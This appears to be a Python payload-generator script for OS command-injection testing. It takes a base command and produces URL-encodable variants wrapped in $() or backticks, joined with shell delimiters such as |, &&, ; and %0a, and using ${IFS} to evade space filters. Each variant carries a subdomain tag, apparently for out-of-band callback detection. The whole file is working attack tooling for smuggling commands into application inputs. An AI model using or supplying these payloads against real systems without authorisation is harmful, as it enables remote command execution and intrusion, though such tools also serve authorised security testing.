#!/bin/python3
import argparse
import urllib.parse
import pyperclip

# pyperclip.copy('The text to be copied to the clipboard.')


def str2bool(v):
    if isinstance(v, bool):
       return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    elif v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


parser = argparse.ArgumentParser(description='')


payload_group = parser.add_argument_group('Paylod options')
payload_group.add_argument('--payload_wrapper', '-p', help='Wraps payload in wrapper. Replace \'*\' in string.. OR for UNION based injections: replace * with columns and ** with source.')
payload_group.add_argument('--base_payload', '-u', required=True, help='base payload, replaces subdomain with an identifier for the payload')
payload_group.add_argument('--identifier', '-i', help='searches for identifier')


encoding_group = parser.add_argument_group('Encoding options')
encoding_ma_group = encoding_group.add_mutually_exclusive_group()
encoding_ma_group.add_argument("--URLEncodeAll", '-ea', type=str2bool, nargs='?',
                        const=True, default=False,
                        help="URL Encodes entire command")
encoding_ma_group.add_argument("--URLEncodePayload", '-ep', type=str2bool, nargs='?',
                        const=True, default=False,
                        help="URL Encodes Payload")

args = parser.parse_args()


base_payload = args.base_payload


payloads_output = []
def print_payload(payload):
    if args.URLEncodePayload and not args.URLEncodeAll:
        payload = urllib.parse.quote(payload)
    
    if args.payload_wrapper:
        output = args.payload_wrapper.replace('*', payload)
    else:
        output = payload

    if args.URLEncodeAll:
        output = urllib.parse.quote(output)
    
    output = output.replace('%250a', '%0a')
    if args.identifier:
        if args.identifier in output:
            payloads_output.append(output)
    else:
        payloads_output.append(output)



# generate payloads
delimiters = ['', '%0a', r'|', r'||', r'&', r'&&', r';']


payloads = []
payloads.append(base_payload)
payloads.append(base_payload.replace(' ', r'${IFS}'))

print_payload(f'$({base_payload})'.replace('SUBDOMAIN', f'w00'))
print_payload(f'`{base_payload}`'.replace('SUBDOMAIN', f'w01'))
print_payload(f'$({base_payload})'.replace('SUBDOMAIN', f'w02'))
print_payload(f'`{base_payload}`'.replace('SUBDOMAIN', f'w03'))
for b, base_payload in enumerate(payloads):
    for i, delimiter in enumerate(delimiters):
        print_payload(f'{delimiter}{base_payload}'.replace('SUBDOMAIN', f'z{b}-{i}0'))
        print_payload(f'{delimiter}{base_payload}#'.replace('SUBDOMAIN', f'z{b}-{i}1'))
        print_payload(f'{delimiter}{base_payload}::'.replace('SUBDOMAIN', f'z{b}-{i}1'))
        print_payload(f'{delimiter}{base_payload}{delimiter}'.replace('SUBDOMAIN', f'z{b}-{i}2'))



# output
print('\n'.join(payloads_output))
pyperclip.copy('\n'.join(payloads_output))

